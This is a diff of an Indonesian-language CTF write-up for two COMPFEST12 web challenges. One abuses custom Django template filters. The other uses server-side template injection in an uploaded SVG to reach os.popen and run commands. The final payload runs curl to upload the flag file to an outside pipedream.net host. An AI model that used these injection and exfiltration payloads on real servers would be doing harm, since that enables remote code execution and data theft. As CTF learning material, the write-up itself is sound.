@@ -1307,15 +1307,13 @@ def cobacek(a):
     ...
 ```
 
-Dengan memanfaatkan fungsi `isinya` yaitu dengan payload `{{ arthropods|isinya }}` akan mendapatkan list dir dari `arthropods`.
+Dengan memanfaatkan fungsi `isinya` yaitu dengan payload `{{{{ arthropods|isinya }}}}`, akan mendapatkan list dir dari `arthropods`.
 
 ```py
 ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']arthropods|isinya
 ```
 
-Lalu, manfaatkan fungsi `ambildong` untuk memanggil dir dari `arthropods` yang ditemukan flag pada dir `__doc__`.
-
-Payload: `\{\{ arthropods|ambildong:"__doc__" \}\}`
+Lalu, manfaatkan fungsi `ambildong` untuk memanggil dir dari `arthropods` yang ditemukan flag pada dir `__doc__`. Payload akhir: `{{{{ arthropods|ambildong:"__doc__" }}}}`
 
 ```py
 COMPFEST12{djan90_cu5t0m_t3mplat3_f1Lters_d0nt_forg3t_t0_set_debu9_fal5e}
@@ -1333,15 +1331,17 @@ arthropods|ambildong:"__doc__"
 Disediakan website yang hanya memiliki fitur upload file svg. Mencoba upload file svg kosong yang valid. Didapati response source sebagai berikut.
 
 ```html
-svg 
-<class 'str'><br><br><br>image None <class 'str'><br><br><br>
+..[snip]..
+image None
+..[snip]..
 ```
 
-Template Injection, dengan menambahkan `\{\{ 2*2 \}\}` pada svg file.
+Template Injection, dengan menambahkan `{{{{ 2*2 }}}}` pada svg file.
 
 ```html
-svg 
-<class 'str'><br><br><br>image 4 <class 'str'><br><br><br>
+..[snip]..
+image 4
+..[snip]..
 ```
 
 Selanjutnya dilakukan template injection dengan menggunakan fungsi dari os module python yaitu `os.popen()` untuk mendapatkan RCE.
@@ -1355,8 +1355,7 @@ Selanjutnya dilakukan template injection dengan menggunakan fungsi dari os modul
 Sebelumnya menggunakan `[]` dll, tetapi gagal `(Internal Server Error)`. Dan mencari-cari payload diinternet, didapatkan menggunakan `config` dan berhasil.
 
 ```html
-svg 
-<class 'str'><br><br><br>image total 84
+..[snip]..image total 84
 drwxr-xr-x   1 root root 4096 Aug 28 02:18 .
 drwxr-xr-x   1 root root 4096 Aug 28 02:18 ..
 -rwxr-xr-x   1 root root    0 Aug 28 02:18 .dockerenv
@@ -1382,7 +1381,7 @@ dr-xr-xr-x  13 root root    0 Aug 28 02:21 sys
 drwxrwxrwt   1 root root 4096 Aug 28 03:43 tmp
 drwxr-xr-x   1 root root 4096 Aug  3 07:00 usr
 drwxr-xr-x   1 root root 4096 Aug  3 07:00 var
-<class 'str'><br><br><br>
+..[snip]..
 ```
 
 Mencoba `cat /loooool_ini_lho_fl4gnya` didapati website `Internal Server Error`. Ternyata kita tidak bisa stdout pada website.
@@ -1393,7 +1392,7 @@ Setelah itu, upload file flag menggunakan `curl` dari server, berikut final payl
 
 ```py
 <svg>
-    <image>\{\{ config.__class__.__init__.__globals__['os'].popen('curl https://c6d3e760ca0abf721ac9c4ffb61a5ed0.m.pipedream.net --upload-file /loooool_ini_lho_fl4gnya').read() \}\}</image>
+    <image>{{{{ config.__class__.__init__.__globals__['os'].popen('curl https://c6d3e760ca0abf721ac9c4ffb61a5ed0.m.pipedream.net --upload-file /loooool_ini_lho_fl4gnya').read() }}}}</image>
 </svg>
 ```
 
